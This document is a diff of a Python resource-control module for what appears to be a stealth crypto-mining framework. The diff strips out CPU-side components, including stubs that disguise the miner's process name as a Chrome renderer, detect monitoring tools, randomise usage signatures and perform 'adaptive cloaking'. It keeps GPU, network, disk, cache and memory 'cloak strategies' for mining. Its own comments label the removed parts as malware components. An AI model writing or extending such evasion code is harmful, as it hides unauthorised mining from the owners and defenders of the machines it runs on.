@@ -38,126 +38,13 @@ resource_logger = get_unified_logger('resource_control')
 
 # ✅ ERROR REPORTER: Get centralized error reporter instance
 error_reporter = get_error_reporter()
-# **CPU Plugin Imports Removed** (đã xóa import plugin CPU – loại bỏ malware framework)
+# **All CPU-related imports removed** (đã xóa hoàn toàn import CPU – chỉ giữ GPU-only mining)
 from threading import RLock
 
-# **Stealth Framework Imports Removed** (đã xóa import framework ẩn danh – loại bỏ malware components)
-try:
-    pass  # CPU plugin imports removed for security
-except ImportError:
-    # Fallback to absolute imports
-    try:
-        import sys
-        import os
-        sys.path.append(os.path.dirname(__file__))
-        # Dead import removed: stealth_execution module không tồn tại
-        from randomx_optimizer import XeonE5OptimizedConfig
-    except ImportError:
-        # Create stub classes if imports fail
-        class StealthProcessManager:
-            def __init__(self, logger): 
-                self.logger = logger
-            def get_fake_process_name(self): 
-                return "chrome --type=renderer"
-        
-        class AntiDetectionSystem:
-            def __init__(self, logger): 
-                self.logger = logger
-                self.detected_threats = set()
-            def detect_monitoring_tools(self): 
-                return []
-            def assess_threat_level(self, threats): 
-                return "LOW"
-            def continuous_threat_monitoring(self, callback=None): 
-                pass
-        
-        class SignatureRandomizer:
-            def __init__(self, logger): 
-                self.logger = logger
-            def generate_dynamic_signature(self, duration): 
-                return [30, 40, 50, 35, 45]
-        
-        class XeonE5OptimizedConfig:
-            def __init__(self, logger): 
-                self.logger = logger
-            def get_stealth_optimized_config(self): 
-                return {
-                    'threads': 6, 'instruction_set': 'avx2', 
-                    'cpu_affinity_groups': [[0], [1], [2], [3], [4], [5]],
-                    'estimated_performance_gain': 1.15,
-                    'physical_cores': 12, 'l3_cache_mb': 35
-                }
-            def generate_mining_config(self, profile):
-                return self.get_stealth_optimized_config()
 
-
-###############################################################################
-#                     CPU RESOURCE MANAGER - REMOVED                          #
-###############################################################################
-
-# ✅ CPU RESOURCE MANAGER REMOVED: All CPU processing logic eliminated
-# Only GPU processing remains active for crypto mining operations
-
-class CPUResourceManager:
-    """
-    ✅ CPU RESOURCE MANAGER REMOVED: Stub class for compatibility
-    All CPU processing, optimization, and cloaking functionality eliminated.
-    Only minimal interface preserved for existing integrations.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
-        """✅ CPU MANAGER DISABLED: Minimal stub initialization"""
-        self.logger = logger
-        self.config = config
-        
-        # ✅ STUB ATTRIBUTES: Minimal required for compatibility
-        self._registered_pids = set()
-        self.stealth_enabled = False
-        self.current_threat_level = "DISABLED"
-        self.throttled_processes = {}
-        
-        self.logger.info("✅ [CPU Manager] DISABLED - All CPU processing eliminated")
-        self.logger.info("🎯 [CPU Manager] GPU-only mining mode active")
-
-    # ✅ STUB METHODS: Minimal compatibility interface
-    def throttle_cpu_usage(self, pid: int, throttle_percentage: float, **kwargs) -> Optional[str]:
-        """✅ CPU THROTTLE DISABLED: Returns None (no CPU throttling)"""
-        self.logger.info(f"⚠️ [CPU Manager] CPU throttling disabled for PID={pid} - GPU-only mode")
-        return None
-
-    def register_pid(self, pid: int) -> None:
-        """✅ CPU PLUGIN REGISTRATION DISABLED: No-op method"""
-        self.logger.info(f"⚠️ [CPU Manager] PID registration disabled for {pid} - GPU-only mode")
-        pass
-
-    def get_available_cpus(self) -> List[int]:
-        """✅ CPU INFO DISABLED: Returns empty list"""
-        return []
-
-    def release_cpu_throttle(self, pid: int, **kwargs) -> None:
-        """✅ CPU THROTTLE RELEASE DISABLED: No-op method"""
-        pass
-
-    def restore_resources(self, pid: int) -> bool:
-        """✅ CPU RESOURCE RESTORE DISABLED: Always returns True"""
-        return True
-
-    def adapt_to_threat(self, threat_level: str) -> None:
-        """✅ CPU THREAT ADAPTATION DISABLED: No-op method"""
-        pass
-
-    # ✅ ADDITIONAL STUB METHODS: For backward compatibility
-    def apply_randomx_optimization(self, pid: int, profile: str = "disabled") -> bool:
-        """✅ RANDOMX OPTIMIZATION DISABLED: Always returns False"""
-        return False
-        
-    def get_stealth_optimized_config(self) -> Dict[str, Any]:
-        """✅ STEALTH CONFIG DISABLED: Returns empty dict"""
-        return {}
-        
-    def start_adaptive_cloaking(self) -> bool:
-        """✅ ADAPTIVE CLOAKING DISABLED: Always returns False"""
-        return False
+# ✅ CPU RESOURCE MANAGER COMPLETELY REMOVED
+# All CPU processing, optimization, and cloaking functionality eliminated.
+# Only GPU processing remains for crypto mining operations.
 
 ###############################################################################
 #                           GPU RESOURCE MANAGER                              #
@@ -1144,7 +1031,6 @@ class ResourceControlFactory:
             logger.info(f"⚙️ [Factory] Creating new resource managers (hash: {config_hash})")
         resource_managers = {}
         manager_classes = {
-            'cpu': CPUResourceManager,
             'gpu': GPUResourceManager,
             'network': NetworkResourceManager,
             'disk_io': DiskIOResourceManager,
@@ -1250,34 +1136,7 @@ class ResourceControlFactory:
     # ------------------------------------------------------------------
     # Fail-safe helper
     # ------------------------------------------------------------------
-    def _apply_rlimits(self, pid: int, cpu_sec: int = 2) -> None:
-        """
-        Áp dụng giới hạn tài nguyên (resource limits) lên một tiến trình.
-        Đây là một phương pháp fallback khi không thể sử dụng cgroups.
-        
-        Args:
-            pid: Process ID để áp dụng giới hạn
-            cpu_sec: Số giây CPU tối đa cho phép sử dụng
-        """
-        try:
-            # Kiểm tra xem tiến trình có tồn tại không
-            if not psutil.pid_exists(pid):
-                self.logger.warning(f"PID {pid} không tồn tại, không thể áp dụng RLIMIT")
-                return
-                
-            # Sử dụng RLIMIT_CPU để giới hạn thời gian CPU
-            # resource.RLIMIT_CPU: Giới hạn thời gian CPU tính bằng giây
-            resource.prlimit(pid, resource.RLIMIT_CPU, (cpu_sec, cpu_sec * 2))
-            
-            # Cũng có thể giới hạn bộ nhớ nếu cần
-            # resource.prlimit(pid, resource.RLIMIT_AS, (memory_bytes, memory_bytes))
-            
-            self.logger.debug(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho PID={pid}")
-        except (ProcessLookupError, PermissionError) as e:
-            self.logger.warning(f"Không thể áp dụng rlimits cho PID={pid}: {e}")
-        except Exception as e:
-            self.logger.debug(f"Lỗi khi áp dụng rlimits: {e}")
-            # Lỗi không quan trọng, phương thức này chỉ là biện pháp dự phòng
+    # ✅ CPU RLIMITS REMOVED: All CPU resource limiting functionality eliminated
 
 ###############################################################################
 #                           RESOURCE COORDINATOR                              #
@@ -1289,7 +1148,7 @@ class ResourceCoordinator:
     Phân biệt giữa direct execution và plugin delegation.
     Optimized với singleton resource managers để prevent redundant creation.
     
-    Strategies: CPU, GPU (with thermal), Network, Disk I/O, Cache, Memory
+    Strategies: GPU (with thermal), Network, Disk I/O, Cache, Memory
     """
     
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
@@ -1303,20 +1162,19 @@ class ResourceCoordinator:
         self.logger = logger
         self.resource_managers = {}
         
-        # Import strategies
+        # Import strategies (CPU strategy removed)
         from .cloak_strategies import (
-            CpuCloakStrategy, GpuCloakStrategy, NetworkCloakStrategy,
+            GpuCloakStrategy, NetworkCloakStrategy,
             DiskIoCloakStrategy, CacheCloakStrategy, MemoryCloakStrategy,
             StrategyType
         )
-        # ✅ NOTE: CpuCloakStrategy imported but disabled (stub implementation)
         
         # ✅ ENHANCED: Use shared resource managers from singleton factory
         try:
             self.resource_managers = ResourceControlFactory.create_resource_managers(config, logger)
             
-            # ✅ VALIDATION: Verify all required managers are available
-            required_managers = ['cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory']
+            # ✅ VALIDATION: Verify all required managers are available (CPU removed)
+            required_managers = ['gpu', 'network', 'disk_io', 'cache', 'memory']
             if ResourceControlFactory.validate_manager_instances(required_managers):
                 self.logger.info("✅ ResourceCoordinator using shared resource managers successfully")
                 
@@ -1330,9 +1188,8 @@ class ResourceCoordinator:
             self.logger.error(f"❌ Lỗi khởi tạo shared resource managers: {e}")
             raise
         
-        # Khởi tạo strategies
+        # Khởi tạo strategies (CPU strategy removed)
         self.strategies = {
-            StrategyType.CPU: CpuCloakStrategy(config, logger, None),  # ✅ DISABLED: Stub implementation
             StrategyType.GPU: GpuCloakStrategy(config, logger, self.resource_managers.get('gpu')),
             StrategyType.NETWORK: NetworkCloakStrategy(config, logger, self.resource_managers.get('network')),
             StrategyType.DISK_IO: DiskIoCloakStrategy(config, logger, self.resource_managers.get('disk_io')),
@@ -1340,7 +1197,7 @@ class ResourceCoordinator:
             StrategyType.MEMORY: MemoryCloakStrategy(config, logger, self.resource_managers.get('memory'), self.resource_managers.get('cache'))
         }
         
-        self.logger.info("✅ ResourceCoordinator khởi tạo 6 unified strategies thành công (thermal integrated trong GPU)")
+        self.logger.info("✅ ResourceCoordinator khởi tạo 5 GPU-only strategies thành công (thermal integrated trong GPU)")
     
     def apply_strategy(self, strategy_type: str, process: Any) -> bool:
         """
@@ -1390,9 +1247,8 @@ class ResourceCoordinator:
                 StrategyType.MEMORY
             ]
         else:
-            # CPU process: áp dụng CPU + các chiến lược chung
+            # Non-GPU process: áp dụng các chiến lược chung (CPU disabled)
             strategies_to_apply = [
-                StrategyType.CPU,
                 StrategyType.NETWORK,
                 StrategyType.DISK_IO,
                 StrategyType.CACHE,
@@ -1434,52 +1290,8 @@ class ResourceCoordinator:
         try:
             self.logger.debug(f"🔄 Ủy quyền chiến lược {strategy_type} cho plugin system")
             
-            # CPU plugin delegation
-            if strategy_type == StrategyType.CPU:
-                cpu_manager = self.resource_managers.get('cpu')
-                if not cpu_manager:
-                    self.logger.error("❌ Không tìm thấy CPU resource manager")
-                    return False
-                    
-                # Đăng ký PID với plugin system
-                cpu_manager.register_pid(process.pid)
-                
-                # Apply các plugin optimization và cloaking theo blueprint
-                try:
-                    plugins_applied = 0
-                    
-                    # Kiểm tra xem cpu_manager có plugins attribute
-                    if hasattr(cpu_manager, 'plugins') and cpu_manager.plugins:
-                        for plugin in cpu_manager.plugins:
-                            if hasattr(plugin, 'apply') and callable(getattr(plugin, 'apply')):
-                                try:
-                                    plugin.apply(process.pid)
-                                    plugins_applied += 1
-                                    self.logger.info(f"✅ Applied CPU plugin: {plugin.__class__.__name__} for PID={process.pid}")
-                                except Exception as plugin_error:
-                                    self.logger.error(f"❌ Lỗi khi áp dụng CPU plugin {plugin.__class__.__name__}: {plugin_error}")
-                                    continue
-                    else:
-                        self.logger.warning("⚠️ CPU manager không có plugins hoặc plugins list rỗng")
-                    
-                    # Fallback: Apply strategy trực tiếp nếu không có plugins
-                    if plugins_applied == 0:
-                        self.logger.warning("⚠️ Không có CPU plugins nào được áp dụng, fallback to direct strategy execution")
-                        strategy.apply(process)
-                        plugins_applied = 1
-                    
-                    self.logger.info(f"✅ Đã ủy quyền chiến lược CPU cho plugin system, PID={process.pid} ({plugins_applied} plugins applied)")
-                    return True
-                    
-                except Exception as e:
-                    self.logger.error(f"❌ Lỗi trong CPU plugin delegation: {e}")
-                    # Fallback to direct execution
-                    self.logger.warning("⚠️ Fallback to direct CPU strategy execution")
-                    strategy.apply(process)
-                    return True
-                
-            # GPU plugin delegation
-            elif strategy_type == StrategyType.GPU:
+            # GPU plugin delegation (CPU delegation removed)
+            if strategy_type == StrategyType.GPU:
                 gpu_manager = self.resource_managers.get('gpu')
                 if not gpu_manager:
                     self.logger.error("❌ Không tìm thấy GPU resource manager")
@@ -1544,7 +1356,7 @@ class CloakStrategyFactory:
         :param config: Cấu hình
         :param logger: Logger
         :param resource_managers: Resource managers
-        :param process_type: 'CPU' hoặc 'GPU' process type cho optimization
+        :param process_type: 'GPU' process type cho optimization
         :param strategy_hints: Optional optimization hints
         :return: Pre-configured strategy instance hoặc None
         """
@@ -1559,22 +1371,19 @@ class CloakStrategyFactory:
         # Import StrategyType
         from .cloak_strategies import StrategyType
         
-        # ✅ ENHANCED: Map strategy name cũ sang StrategyType mới cho comprehensive cloaking
+        # ✅ ENHANCED: Map strategy name cho GPU-only comprehensive cloaking (CPU removed)
         strategy_mapping = {
-            'cpu': StrategyType.CPU,
             'gpu': StrategyType.GPU,
             'network': StrategyType.NETWORK,
             'disk_io': StrategyType.DISK_IO,
             'cache': StrategyType.CACHE,
             'memory': StrategyType.MEMORY,
-            # ✅ REMOVED: 'thermal_control' - unified vào GpuCloakStrategy
-            'cpu_cloaking': None,  # ✅ CPU DISABLED
+            # GPU cloaking strategies
             'gpu_cloaking': StrategyType.GPU,
             'network_cloaking': StrategyType.NETWORK,
             'disk_io_cloaking': StrategyType.DISK_IO,
             'cache_cloaking': StrategyType.CACHE,
             'memory_cloaking': StrategyType.MEMORY,
-            # ✅ REMOVED: 'thermal_cloaking' - unified vào GpuCloakStrategy
         }
         
         if strategy_name in strategy_mapping:
@@ -1601,15 +1410,14 @@ class CloakStrategyFactory:
     @staticmethod
     def get_available_strategies() -> List[str]:
         """
-        Lấy danh sách 6 unified strategies có sẵn cho tương thích ngược.
+        Lấy danh sách 5 GPU-only strategies có sẵn cho tương thích ngược.
         Thermal management được integrate trong GPU strategy.
         
-        :return: List các strategy names (6 strategies)
+        :return: List các strategy names (5 strategies, CPU removed)
         """
         from .cloak_strategies import StrategyType
         
         return [
-            StrategyType.CPU,
             StrategyType.GPU,
             StrategyType.NETWORK,
             StrategyType.DISK_IO,
